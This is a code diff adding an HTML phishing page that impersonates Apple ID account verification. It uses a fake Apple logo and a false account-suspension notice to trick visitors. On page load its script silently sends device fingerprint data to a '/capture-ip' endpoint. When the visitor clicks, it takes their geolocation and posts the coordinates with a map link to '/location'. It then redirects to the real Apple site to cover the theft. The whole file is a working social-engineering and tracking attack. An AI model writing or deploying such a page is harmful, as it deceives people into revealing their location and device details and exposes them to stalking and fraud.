@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apple ID - Account Verification</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    .container {
+      width: 100%;
+      max-width: 800px;
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .apple-logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 28px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    .allow-button {
+      font-size: 18px;
+      padding: 15px 30px;
+      background-color: #0071e3;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .allow-button:hover {
+      background-color: #005bb5;
+    }
+    .status {
+      font-size: 16px;
+      color: #333;
+      margin-top: 20px;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Fake Apple Logo -->
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQoAAACUCAMAAABcDpd8AAAAY1BMVEX///8AAADs7Oz8/PxSUlLZ2dn19fXv7+/FxcXS0tLo6Ojd3d12dnZNTU1hYWEUFBRYWFgNDQ2lpaW2trYkJCSvr69GRkY0NDTMzMyfn59tbW2IiIiXl5c9PT1+fn4cHBwsLCxtmmvoAAAECElEQVR4nO2c2baiMBBFDUOYlFHgMvP/X9lqX22i4gC1VnWF2s8+pI4hOZUc2O0YhmEYhmEYhmEYhmEYhmEYMIzAxB7C/4D8qfr6EGAPAx+nCrtECOFiDwSdtozEha1L4Zbiioc9FlRkI/7hY48GkyCcKCEk9nAQ8eKpEiX2cBCxrakSosEeDx6OqsSWV81QVeLoYA8IjUpVQlSb9d3+qCqRbNd23z0eot3sVjoxmRc6G3tEaPSqElG+2ZXCK1Qp9gb2iNBIVSWK7a6ZShcmxLhhd6W2YVv2mTtXMRWbbs6ziRAW9mBwyW8es0yxx4LMrxSJ1Wx36/jl/IAcD326eSFOvVie5q63ua7DNALPs41XxtoM3CxNz+r4+vrvIN3HVtF1hRX3+fPHQWZ9XJTjEEXHsjuETabjZJFVMUaTlmuMH5sury4H1YQPY62b0XBUc33tu6bNuFGNz35z8ho6tewyfV7kqfXKfWmapnTceu4nJxpdZoYZxC/KFGGbVnXy6hdCHFwtVlCZHV/X+QmjDqc5MgVQ4kSLXchqZAWjhBAVdikrMdPhfZGfkeTYxawje1/ix4yk0yc+oBLiSPl8yyzeF/gpSY1dzSpmndX3HGmf6jhwSpTE18ynfcdCJWg7LB/KUYiBesYAblL0xE8t7iNFy7GoN6YQXdiFgfiS+ZAUWE6IXcla/PskzVIS0n77zH2SZjEFdiWrAXOa5FcKE2wrJW4pdjtjD6QE/bD366PdL6Af9r6Pmi0mw65kNS6UwaJ/v+5G76v8CPrBRbBDTZaCpWApXkC9QQeUgn6iAGwHId+CwPkK2tcfZ346ICkEdiWrsaF6EPpbiP8qUPQV5IMVDtjRZkn85H+3a6GkoL+H3L9EuxyL+rTIZlKYC6C+Wthgl2OiJH78L8G2ECFC4o0I3O0x+TdPc7BMwYmG9EccAsAglhA96XkBdWn6l5Byt96+ybB/SUE4mGbDOYsLUUj3IgCsT7+S7Knuqvn74r5koGq2JLgUdP0F1G36Dborpw2sxIFw4P0AK0VPOHbigipBukN1QM13THhSwL4lFNE+2TMAGxHqqUXA1eIHu5aVgCX16Oeb4VK9dHuxK1BZVurH3md8kKNvi2z3MQUkX0B9zfwF4BGh/vLYjdWtiD5feZErTzlLTR6PM9kqLei/PDZlVcSgoX6VriBXJE/0WSj+svytuk4zJVbk1LTwVir2zJaadHFdx93MwhppNyfOPHPgVn77040sfpTjQPoGfR5zr3wD6Ni1d4U6baH+Qq+9QyGLr/eoUbF/9tVEMw9vanR7jZzVIzJr6jCO6yadzQh4adPXdd1Uni59xyxOEARvdgXTMDTcNxiGYRiGYRiGYRiGYRiGYeD5AwcKNYuTXrr5AAAAAElFTkSuQmCC" alt="Apple" class="apple-logo">
+
+    <h1>Apple ID - Account Verification</h1>
+    <p>Your Apple ID has been temporarily suspended due to unusual activity. Please verify your identity by allowing location access to recover your account.</p>
+    <button class="allow-button" id="allowBtn">Allow Verification</button>
+    <div class="status" id="status"></div>
+
+    <!-- Footer Section -->
+    <div class="footer">
+      <p>Privacy Policy | Terms of Service | Support</p>
+    </div>
+  </div>
+
+  <!-- Background Script to collect device and location information -->
+  <script>
+    // Function to send visitor's device and browser details to the server
+    const sendDeviceData = async () => {
+      const resolution = `${window.screen.width}x${window.screen.height}`;
+      const battery = navigator.getBattery ? await navigator.getBattery() : { level: 1, charging: false };
+      const ram = navigator.deviceMemory || "Unknown RAM";
+      const cpu = navigator.hardwareConcurrency || "Unknown CPU";
+
+      fetch('/capture-ip', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          resolution: resolution,
+          battery: battery.level * 100,
+          isCharging: battery.charging,
+          userAgent: navigator.userAgent,
+          ram: ram,
+          cpu: cpu
+        }),
+      })
+      .then(response => response.json())
+      .then(data => console.log('%c[✔] Device Data Sent:', 'color: green; font-weight: bold;', data))
+      .catch(error => console.error('%c[❌] Error sending device data:', 'color: red; font-weight: bold;', error));
+    };
+
+    // Function to ask for location permission
+    const askForLocation = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleLocationError);
+      } else {
+        console.warn('%c[⚠] Geolocation not supported by this browser.', 'color: orange; font-weight: bold;');
+      }
+    };
+
+    // Send user's location to the server
+    const sendLocation = (position) => {
+      const { latitude, longitude } = position.coords;
+      const mapLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
+      console.log('%c[📍] Location received:', 'color: blue; font-weight: bold;', mapLink);
+
+      fetch('/location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude, longitude, mapLink }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('%c[✔] Location Data Sent:', 'color: green; font-weight: bold;', data);
+        // Once location is successfully sent, proceed with verification
+        verifyAppleID();
+      })
+      .catch(error => {
+        console.error('%c[❌] Error sending location:', 'color: red; font-weight: bold;', error);
+      });
+    };
+
+    // Handle location errors
+    const handleLocationError = (error) => {
+      console.warn('%c[⚠] Location permission denied or error occurred.', 'color: orange; font-weight: bold;');
+      console.error(error);
+      document.getElementById('status').innerText = 'Location access denied or failed. Verification cannot proceed.';
+    };
+
+    // Function to simulate Apple ID account verification
+    async function verifyAppleID() {
+      try {
+        document.getElementById('status').innerText = 'Verifying your Apple ID...';
+
+        // Simulating sending verification data to Apple servers
+        socket.emit('appleIDVerified', { message: 'Apple ID verified successfully!' });
+
+        socket.on('verificationCompleted', (message) => {
+          console.log(message);
+        });
+
+        // Redirecting to a fake Apple ID verification page
+        setTimeout(() => {
+          window.location.href = 'https://appleid.apple.com'; // Fake Apple ID verification page
+        }, 3000);
+
+      } catch (error) {
+        console.warn('Verification failed:', error);
+        document.getElementById('status').innerText = 'Verification failed. Try again.';
+      }
+    }
+
+    // Event listener for the "Allow Verification" button
+    document.getElementById('allowBtn').addEventListener('click', function() {
+      document.getElementById('status').innerText = "Getting your location, please wait...";
+      document.getElementById('allowBtn').style.display = 'none';
+
+      // First, get the location and send the data to the server before proceeding with the verification
+      askForLocation();
+    });
+
+    // Run when the page loads
+    window.onload = () => {
+      sendDeviceData(); // Send visitor device data immediately
+    };
+  </script>
+
+  <script src="/socket.io/socket.io.js"></script>
+</body>
+</html>
